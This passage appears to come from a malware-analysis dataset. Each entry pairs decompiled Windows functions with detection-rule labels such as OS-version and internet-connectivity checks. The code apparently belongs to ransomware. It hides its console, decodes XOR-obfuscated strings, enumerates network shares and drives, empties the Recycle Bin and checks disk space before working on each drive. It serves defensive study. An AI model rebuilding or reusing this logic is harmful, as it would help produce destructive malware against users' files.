                  iVar12 = iVar12 + 1;\n                        }\n                        *(&var_c0h + iVar15) = 0;\n                        puVar13 = (*pcVar9)(&var_c0h);\n                        iVar15 = *0x428e60;\n                        uVar16 = puVar13[1];\n                        uVar4 = puVar13[2];\n                        uVar5 = puVar13[3];\n                        puVar1 = iVar11 + 0x10 + *0x428e60;\n                        *puVar1 = *puVar13;\n                        puVar1[1] = uVar16;\n                        puVar1[2] = uVar4;\n                        puVar1[3] = uVar5;\n                        iVar12 = 0;\n                        while (var_52eh._1_1_ != '\\0') {\n                            var_52eh._1_1_ = *(&var_52eh + iVar12 + 2);\n                            iVar12 = iVar12 + 1;\n                        }\n                        fcn.0040cbe0(iVar11 + 0x20 + iVar15, &var_52eh + 1, iVar12);\n                        *0x42932c = 0;\n                        while (var_52eh._1_1_ != '\\0') {\n                            var_52eh._1_1_ = *(&var_52eh + *0x42932c + 2);\n                            *0x42932c = *0x42932c + 1;\n                        }\n                        *0x42932c = *0x42932c + iVar11 + 0x20;\n                        iVar11 = 0x483;\n                        puVar14 = ptr;\n                        do {\n                            *puVar14 = 0;\n                            puVar14 = puVar14 + 1;\n                            iVar11 = iVar11 + -1;\n                        } while (iVar11 != 0);\n                        (*_sym.imp.msvcrt.dll_free)(ptr);\n                        return 1;\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 9586
    },
    "00409810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409810(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t in_FS_OFFSET;\n    uint uVar7;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uchar auStack16 [3];\n    uint32_t var_9h;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_AllocConsole)();\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n    (*_sym.imp.USER32.dll_ShowWindow)(uVar5, 0);\n    uVar6 = 0;\n    var_18h = *0x4243b0;\n    uStack24 = *0x4243b4;\n    uStack20 = *0x4243b8;\n    _auStack16 = *0x4243bc;\n    do {\n        var_18h._0_1_ = *0x4243b0;\n        puVar1 = &var_18h + uVar6 + 1;\n        *puVar1 = *puVar1 ^ var_18h;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0xe);\n    _auStack16 = _auStack16 & 0xffffff;\n    (*_sym.imp.KERNEL32.dll_SetConsoleTitleA)(&var_18h + 1);\n    (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)(fcn.00409b90, 1);\n    (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)(0, 0);\n    uVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(uVar5, 0xffffffec);\n    (*_sym.imp.USER32.dll_SetWindowLongA)(uVar5, 0xffffffec, uVar6 | 0x80000);\n    (*_sym.imp.USER32.dll_SetLayeredWindowAttributes)(uVar5, 0, 0xbf, 2);\n    iVar4 = (*_sym.imp.USER32.dll_GetSystemMenu)(uVar5, 0);\n    if (iVar4 != 0) {\n        (*_sym.imp.USER32.dll_EnableMenuItem)(iVar4, 0xf060, 3);\n        (*_sym.imp.USER32.dll_DeleteMenu)(iVar4, 0xf060, 0);\n    }\n    iVar4 = *(in_FS_OFFSET + 0x30);\n    (*_sym.imp.KERNEL32.dll_GetConsoleMode)(*(*(iVar4 + 0x10) + 0x18), &var_9h + 1);\n    (*_sym.imp.KERNEL32.dll_SetConsoleMode)(*(*(iVar4 + 0x10) + 0x18), stack0xfffffff4 & 0xffffffbf | 0x80);\n    pcVar3 = _sym.imp.USER32.dll_RegisterHotKey;\n    (*_sym.imp.USER32.dll_RegisterHotKey)(0, 1, 4, 0x70);\n    (*pcVar3)(0, 2, 0, 0x70);\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageW)(&var_34h, 0, 0, 0);\n    pcVar3 = _sym.imp.USER32.dll_SetForegroundWindow;\n    do {\n        if (iVar4 == 0) {\n            return 0;\n        }\n        (*_sym.imp.USER32.dll_PeekMessageW)(&var_34h, 0, 0, 0, 0);\n        if (var_30h == 0x312) {\n            if (var_2ch == 1) {\n                (*pcVar3)(uVar5);\n                uVar7 = 5;\n            }\n            else {\n                if (var_2ch != 2) goto code_r0x0040996c;\n                uVar7 = 0;\n            }\n            (*pcVar2)(uVar5, uVar7);\n        }\ncode_r0x0040996c:\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageW)(&var_34h, 0, 0, 0);\n    } while( true );\n}\n",
        "token_count": 1012
    },
    "00409a90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409a90(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_23h;\n    uint uStack35;\n    uint uStack31;\n    uint uStack27;\n    uint var_13h;\n    uint var_fh;\n    uint var_bh;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    uint var_1h;\n    \n    if (*0x427110 == NULL) {\n        uVar3 = 0;\n        var_23h = *0x4246b0;\n        uStack35 = *0x4246b4;\n        uStack31 = *0x4246b8;\n        uStack27 = *0x4246bc;\n        var_13h = 0x2f2e3220;\n        var_fh = 0x20243302;\n        var_bh._0_2_ = 0x2435;\n        do {\n            var_23h._0_1_ = *0x4246b0;\n            puVar1 = &var_23h + uVar3 + 1;\n            *puVar1 = *puVar1 ^ var_23h;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x19);\n        var_bh._2_1_ = 0;\n        var_bh._3_1_ = 0x69;\n        var_1h._0_1_ = 0;\n        var_7h = 0x75;\n        var_3h = 0x33;\n        var_6h = 0x73;\n        var_5h = 0x65;\n        var_4h = 0x72;\n        var_2h = 0x32;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&var_7h, &var_23h + 1);\n        *0x427110 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    }\n    if ((((arg_ch != 0x11) && (arg_ch != 0x16)) && (arg_ch != 0x10)) && (arg_ch != 0x12)) {\n        if (arg_ch == 1) {\n            (**0x427110)(arg_8h, 0);\n            return 0;\n        }\n        uVar2 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n        return uVar2;\n    }\n    fcn.00409c90();\n    (**0x427110)(arg_8h, 0);\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    return 0;\n}\n",
        "token_count": 696
    },
    "0040a0b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040a0b0(char *arg_8h, uint arglist)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint var_134h;\n    uint lpSystemTime;\n    ushort var_2ch;\n    ushort var_2ah;\n    uint var_28h;\n    uint var_21h;\n    uint uStack33;\n    uint uStack29;\n    uint uStack25;\n    ushort var_11h;\n    uchar var_fh;\n    uint var_eh;\n    uchar var_ah;\n    uchar var_9h;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    fcn.0040cc00(&ARG_0, 0, 0x400);\n    var_8h = 0;\n    if (arg_8h != NULL) {\n        cVar2 = *arg_8h;\n        while (cVar2 != '\\0') {\n            var_8h = var_8h + 1;\n            cVar2 = arg_8h[var_8h];\n        }\n    }\n    iVar6 = (*_sym.imp.USER32.dll_wvsprintfA)(&ARG_0, arg_8h, &arglist);\n    pcVar4 = _sym.imp.USER32.dll_wsprintfA;\n    var_eh._0_1_ = 0x53;\n    var_9h = 0;\n    var_eh._1_1_ = 0x25;\n    var_eh._2_1_ = 0x73;\n    var_ah = 10;\n    var_eh._3_1_ = 0xd;\n    (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, &var_eh + 1, &ARG_0);\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    uVar8 = 0;\n    var_21h = str.pUB._0_4_;\n    uStack33 = *0x424414;\n    uStack29 = *0x424418;\n    uStack25 = *0x42441c;\n    var_11h = 0x502d;\n    var_fh = 0;\n    do {\n        var_21h._0_1_ = str.pUB._0_4_;\n        puVar1 = &var_21h + uVar8 + 1;\n        *puVar1 = *puVar1 ^ var_21h;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x11);\n    var_fh = 0;\n    (*pcVar4)(&var_134h, &var_21h + 1, var_2ch, var_2ah, var_28h);\n    if ((var_8h <= iVar6) || (*(in_FS_OFFSET + 0x34) == 0)) {\n        iVar6 = *(in_FS_OFFSET + 0x30);\n        (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)(0x427948);\n        (*_sym.imp.KERNEL32.dll_SetThreadUILanguage)(0x409);\n        pcVar4 = _sym.imp.KERNEL32.dll_SetConsoleTextAttribute;\n        (*_sym.imp.KERNEL32.dll_SetConsoleTextAttribute)(*(*(iVar6 + 0x10) + 0x1c), 10);\n        pcVar5 = _sym.imp.KERNEL32.dll_WriteFile;\n        iVar3 = 0;\n        while (var_134h != '\\0') {\n            var_134h._0_1_ = *(&var_134h + iVar3 + 1);\n            iVar3 = iVar3 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_WriteFile)(*(*(iVar6 + 0x10) + 0x1c), &var_134h, iVar3, &var_8h, 0);\n        (*pcVar4)(*(*(iVar6 + 0x10) + 0x1c), 0xf);\n        iVar3 = 0;\n        while (ARG_0 != '\\0') {\n            ARG_0._0_1_ = *(&ARG_0 + iVar3 + 1);\n            iVar3 = iVar3 + 1;\n        }\n        (*pcVar5)(*(*(iVar6 + 0x10) + 0x1c), &ARG_0, iVar3, &var_8h, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n        iVar6 = (*_sym.imp.USER32.dll_IsWindowVisible)(uVar7);\n        if (iVar6 != 0) {\n            (*_sym.imp.USER32.dll_FlashWindow)(uVar7, 0);\n        }\n        (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x427948);\n    }\n    return var_8h;\n}\n",
        "token_count": 1135
    },
    "0040a440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a440(uint param_1)\n\n{\n    int16_t iVar1;\n    int16_t *arg_ch;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint unaff_EBX;\n    uint32_t unaff_EDI;\n    uint32_t uVar7;\n    uchar *puStack44;\n    uchar auStack12 [8];\n    \n    puStack44 = auStack12;\n    iVar3 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(2, 0, 0x13, param_1);\n    if ((iVar3 == 0) && (iVar3 = (*_sym.imp.msvcrt.dll_malloc)(puStack44),  iVar3 != 0)) {\n        while( true ) {\n            fcn.0040cc00(iVar3, 0, puStack44);\n            iVar4 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(unaff_EBX, &stack0xffffffd8, iVar3, &puStack44);\n            if (iVar4 != 0) break;\n            uVar7 = 0;\n            iVar4 = iVar3;\n            if (unaff_EDI != 0) {\n                do {\n                    if ((*(iVar4 + 0xc) & 2) != 0) {\n                        fcn.0040a440();\n                    }\n                    if (*(iVar3 + 4) != 2) {\n                        uVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x400);\n                        arg_ch = *(iVar3 + 0x14);\n                        iVar6 = 0;\n                        if (arg_ch != NULL) {\n                            iVar1 = *arg_ch;\n                            piVar2 = arg_ch;\n                            while (iVar1 != 0) {\n                                piVar2 = piVar2 + 1;\n                                iVar6 = iVar6 + 1;\n                                iVar1 = *piVar2;\n                            }\n                        }\n                        fcn.0040cbe0(uVar5, arg_ch, iVar6 * 2 + 2);\n                        uVar5 = fcn.0040cc20();\n                        *(*0x429310 * 4 + 0x427960) = uVar5;\n                        LOCK();\n                        *0x429310 = *0x429310 + 1;\n                    }\n                    uVar7 = uVar7 + 1;\n                    iVar4 = iVar4 + 0x20;\n                } while (uVar7 < unaff_EDI);\n            }\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar3);\n        iVar3 = (*_sym.imp.MPR.dll_WNetCloseEnum)(unaff_EBX);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 622
    },
    "0040a670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a670(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_4ch;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    ushort var_18h;\n    uint var_15h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh [3];\n    uint32_t lpRootPathName;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)(0x427930);\n    uVar4 = fcn.0040cc20();\n    *(*0x429310 * 4 + 0x427960) = uVar4;\n    LOCK();\n    *0x429310 = *0x429310 + 1;\n    uVar4 = fcn.0040cc20();\n    *(*0x429310 * 4 + 0x427960) = uVar4;\n    LOCK();\n    *0x429310 = *0x429310 + 1;\n    uVar4 = fcn.0040cc20();\n    *(*0x429310 * 4 + 0x427960) = uVar4;\n    LOCK();\n    *0x429310 = *0x429310 + 1;\n    var_4h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    pcVar3 = _sym.imp.msvcrt.dll_malloc;\n    uVar6 = 0x1a;\n    lpRootPathName = *0x422f3c;\n    var_8h._0_2_ = *0x422f40;\n    do {\n        uVar6 = uVar6 - 1;\n        if ((*(&var_4h + (uVar6 >> 3)) >> (uVar6 & 7) & 1) == 0) {\ncode_r0x0040a819:\n            lpRootPathName = lpRootPathName & 0xffff0000 | lpRootPathName - 1;\n        }\n        else {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&lpRootPathName);\n            if (((iVar5 != 3) && (iVar5 != 2)) && (iVar5 != 6)) goto code_r0x0040a819;\n            iVar5 = (*pcVar3)(10);\n            if (iVar5 != 0) {\n                var_28h = 0x250068;\n                var_24h = 0x5c0073;\n                var_20h._0_2_ = 0;\n                var_20h._2_2_ = str.threads_closed__waiting_handles...._0_2_;\n                var_1ch = str.threads_closed__waiting_handles...._2_2_;\n                var_1ah = str.threads_closed__waiting_handles...._4_2_;\n                var_18h = 0;\n                (*_sym.imp.USER32.dll_wsprintfW)(iVar5, &var_28h + 2, &lpRootPathName);\n                uVar4 = fcn.0040cc20();\n                *(*0x429310 * 4 + 0x427960) = uVar4;\n                LOCK();\n                *0x429310 = *0x429310 + 1;\n                goto code_r0x0040a819;\n            }\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n        if (uVar6 == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(15000);\n            iVar5 = *0x429310;\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(*0x429310, 0x427960, 0, 0xffffffff);\n            uVar6 = 0;\n            var_4ch = *0x424e60;\n            uStack76 = *0x424e64;\n            uStack72 = *0x424e68;\n            uStack68 = *0x424e6c;\n            var_2ch = 0x7f7f7f;\n            var_3ch = str.q08_8_6q90_54_m_____I_______A._0_4_;\n            uStack60 = str.q08_8_6q90_54_m_____I_______A._4_4_;\n            uStack56 = str.q08_8_6q90_54_m_____I_______A._8_4_;\n            uStack52 = str.q08_8_6q90_54_m_____I_______A._12_4_;\n            do {\n                var_4ch._0_1_ = *0x424e60;\n                puVar1 = &var_4ch + uVar6 + 1;\n                *puVar1 = *puVar1 ^ var_4ch;\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < 0x22);\n            var_2ch = var_2ch & 0xffffff;\n            fcn.0040a0b0(&var_4ch + 1, iVar5);\n            do {\n                do {\n                    (*pcVar2)(100);\n                } while (*0x429330 != 0);\n            } while (*0x427114 != 0);\n            uVar4 = 0x427930;\n            (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)();\n            var_15h._0_1_ = 0x6a;\n            var_fh[2] = 0;\n            var_15h._1_1_ = 0x43;\n            var_10h = 0x6e;\n            var_15h._2_1_ = 0x6c;\n            var_15h._3_1_ = 0x65;\n            var_fh[0] = 0x75;\n            var_11h = 0x61;\n            var_fh[1] = 0x70;\n            fcn.0040a0b0(&var_15h + 1, uVar4);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1457
    },
    "0040a910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a910(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_FS_OFFSET;\n    int16_t *piVar6;\n    uchar uStack2466;\n    uchar uStack2465;\n    uint uStack2464;\n    uint uStack2460;\n    int16_t iStack2456;\n    int16_t iStack2454;\n    int16_t iStack2452;\n    uint uStack2450;\n    uint uStack2446;\n    ushort uStack2442;\n    ushort uStack2440;\n    ushort uStack2438;\n    uint32_t uStack2436;\n    uint32_t uStack2432;\n    uint32_t uStack2428;\n    uchar auStack2424 [12];\n    uchar auStack2412 [8];\n    uchar auStack2404 [8];\n    uchar auStack2396 [60];\n    uchar auStack2336 [32];\n    uchar auStack2304 [104];\n    uchar auStack2200 [32];\n    uchar auStack2168 [456];\n    uchar auStack1712 [36];\n    uchar auStack1676 [544];\n    uchar auStack1132 [528];\n    uchar auStack604 [600];\n    \n    LOCK();\n    *0x427114 = *0x427114 + 1;\n    (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)();\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    iVar5 = 0;\n    if (0 < *0x429308) {\n        do {\n            iVar3 = (*pcVar2)(*(iVar5 * 4 + 0x427120), arg_8h);\n            if (iVar3 == 0) goto code_r0x0040acd2;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < *0x429308);\n    }\n    pcVar2 = _sym.imp.USER32.dll_wsprintfW;\n    uStack2466 = 0x25;\n    uStack2465 = 0;\n    uStack2464 = 0x5c0073;\n    uStack2460 = 0x2a;\n    iStack2456 = *0x422f16;\n    iStack2454 = str._s_S[0];\n    iStack2452 = str._s_S[1];\n    uStack2450 = str._s_S[2];\n    (*_sym.imp.USER32.dll_wsprintfW)(auStack1132, &uStack2466, arg_8h);\n    iVar5 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(auStack1132, 0, auStack604, 0, 0, 0);\n    if (iVar5 != -1) {\n        (*_sym.imp.KERNEL32.dll_FindClose)(iVar5);\n        uStack2450 = 0x3c0019;\n        uStack2446 = 0x45006a;\n        uStack2436 = CONCAT22(str._S__s_total____s_free._2_2_, str._S__s_total____s_free._0_2_) ^ 0x190019;\n        uStack2442 = 0x3c;\n        uStack2440 = 0x4a;\n        uStack2438 = 0x19;\n        uStack2432 = CONCAT22(str._S__s_total____s_free._6_2_, str._S__s_total____s_free._4_2_) ^ 0x190019;\n        uStack2428 = str._S__s_total____s_free._8_2_ ^ 0x19;\n        uVar4 = 0;\n        do {\n            *(&uStack2450 + uVar4 * 2 + 2) = *(&uStack2450 + uVar4 * 2 + 2) ^ 0x19;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0xb);\n        uStack2428 = uStack2428 & 0xffff;\n        (*pcVar2)(auStack2168, &uStack2450 + 2, arg_8h, \"fuplqrnihfjixoa\");\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateFileW)(auStack2168, 0xc0000000, 0, 0, 1, 0x4000100, 0);\n        if ((iVar5 != -1) || (*(in_FS_OFFSET + 0x34) != 0xb7)) {\n            arg_8h_00 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n            *(*0x429308 * 4 + 0x427120) = arg_8h_00;\n            fcn.0040cc00(arg_8h_00, 0, 0x410);\n            iVar3 = 0;\n            if (arg_8h != NULL) {\n                iVar1 = *arg_8h;\n                piVar6 = arg_8h;\n                while (iVar1 != 0) {\n                    piVar6 = piVar6 + 1;\n                    iVar3 = iVar3 + 1;\n                    iVar1 = *piVar6;\n                }\n            }\n            fcn.0040cbe0(*(*0x429308 * 4 + 0x427120), arg_8h, iVar3 * 2 + 2);\n            *0x429308 = *0x429308 + 1;\n            (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x30);\n            (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, arg_8h, 7);\n            piVar6 = arg_8h;\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceExW)(arg_8h, auStack2396, auStack2412, auStack2404);\n            if (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_SetThreadUILanguage)(0x409);\n                pcVar2 = _sym.imp.SHLWAPI.dll_StrFormatByteSize64A;\n                (*_sym.imp.SHLWAPI.dll_StrFormatByteSize64A)(uStack2432, uStack2428, auStack2304, 100);\n                (*pcVar2)(CONCAT22(uStack2438, uStack2440), uStack2436, auStack2424, 100);\n                uVar4 = 0;\n                uStack2466 = 9;\n                do {\n                    (&stack0xfffff64a)[uVar4] = (&stack0xfffff64a)[uVar4] ^ *0x424980;\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < 0x15);\n                uStack2465 = 0;\n                (*_sym.imp.USER32.dll_wsprintfA)(auStack1712, &stack0xfffff64a, arg_8h, auStack2336, &uStack2440);\n                fcn.0040a0b0(auStack1676, piVar6);\n            }\n            fcn.0040acf0();\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n            (*_sym.imp.KERNEL32.dll_DeleteFileW)(auStack2200);\n            LOCK();\n            *0x427114 = *0x427114 + -1;\n            (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n        }\n    }\ncode_r0x0040acd2:\n    LOCK();\n    *0x427114 = *0x427114 + -1;\n    (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x30);\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1757
    },
    "0040c200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c200(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint var_82h;\n    uint uStack130;\n    uint uStack126;\n    uint uStack122;\n    uint var_72h;\n    uint uStack114;\n    uint uStack110;\n    uint uStack106;\n    uint var_62h;\n    uint uStack98;\n    uint uStack94;\n    uint uStack90;\n    uint var_52h;\n    uint uStack82;\n    uint uStack78;\n    uint uStack74;\n    uint var_42h;\n    uint uStack66;\n    uint uStack62;\n    uint uStack58;\n    uint var_32h;\n    uint uStack50;\n    uint uStack46;\n    uint uStack42;\n    uint var_22h;\n    uint uStack34;\n    uint uStack30;\n    uint uStack26;\n    uint var_12h;\n    uint uStack18;\n    uint uStack14;\n    uint uStack10;\n    uint var_2h;\n    \n    uVar3 = 0;\n    var_82h = *0x4245c0;\n    uStack130 = *0x4245c4;\n    uStack126 = *0x4245c8;\n    uStack122 = *0x4245cc;\n    var_2h._0_2_ = 0x43;\n    var_72h = *0x424940;\n    uStack114 = *0x424944;\n    uStack110 = *0x424948;\n    uStack106 = *0x42494c;\n    var_62h = *0x424c50;\n    uStack98 = *0x424c54;\n    uStack94 = *0x424c58;\n    uStack90 = *0x424c5c;\n    var_52h = *0x4247d0;\n    uStack82 = *0x4247d4;\n    uStack78 = *0x4247d8;\n    uStack74 = *0x4247dc;\n    var_42h = *0x424b70;\n    uStack66 = *0x424b74;\n    uStack62 = *0x424b78;\n    uStack58 = *0x424b7c;\n    var_32h = *0x4245d0;\n    uStack50 = *0x4245d4;\n    uStack46 = str.EYPE._0_4_;\n    uStack42 = *0x4245dc;\n    var_22h = *0x424920;\n    uStack34 = *0x424924;\n    uStack30 = *0x424928;\n    uStack26 = *0x42492c;\n    var_12h = *0x424aa0;\n    uStack18 = *0x424aa4;\n    uStack14 = *0x424aa8;\n    uStack10 = *0x424aac;\n    do {\n        var_82h._0_1_ = *0x4245c0;\n        puVar2 = &var_82h + uVar3 + 1;\n        *puVar2 = *puVar2 ^ var_82h;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0x80);\n    var_2h._0_2_ = var_2h & 0xff;\n    pcVar1 = &var_82h + 1;\n    var_82h._1_1_ = *0x4245c0 >> 8;\n    while (var_82h._1_1_ != '\\0') {\n        pcVar1 = pcVar1 + 1;\n        var_82h._1_1_ = *pcVar1;\n    }\n    fcn.0040c2c0();\n    return;\n}\n",
        "token_count": 889
    },
    "0040c2c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040c2c0(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint16_t *puVar11;\n    code *pcVar12;\n    uint uVar13;\n    uint16_t **ppuVar14;\n    bool bVar15;\n    uint lpPathName;\n    uint ARG_0;\n    uint var_e0h;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    float var_ach;\n    float var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    uint var_84h;\n    uint var_80h;\n    float var_7ch;\n    float var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint phkResult;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    uint var_46h;\n    uint var_42h;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_36h;\n    uint lpSubKey;\n    uint var_2eh;\n    uint var_2ah;\n    uint16_t var_26h;\n    uint8_t var_24h;\n    uchar var_23h;\n    uint16_t var_22h;\n    uint8_t var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    ushort var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    ushort var_4h;\n    uchar var_2h;\n    \n    var_a4h = 1;\n    var_a0h = 0;\n    var_9ch = 0;\n    var_98h = 0;\n    var_68h = param_2;\n    iVar4 = (*_sym.imp.gdiplus.dll_GdiplusStartup)(&var_b8h, &var_a4h, 0);\n    pcVar12 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar4 < 0) {\n        return 0;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x10);\n    iVar5 = (*pcVar12)(0x11);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if (iVar5 == 0) {\n        return 0;\n    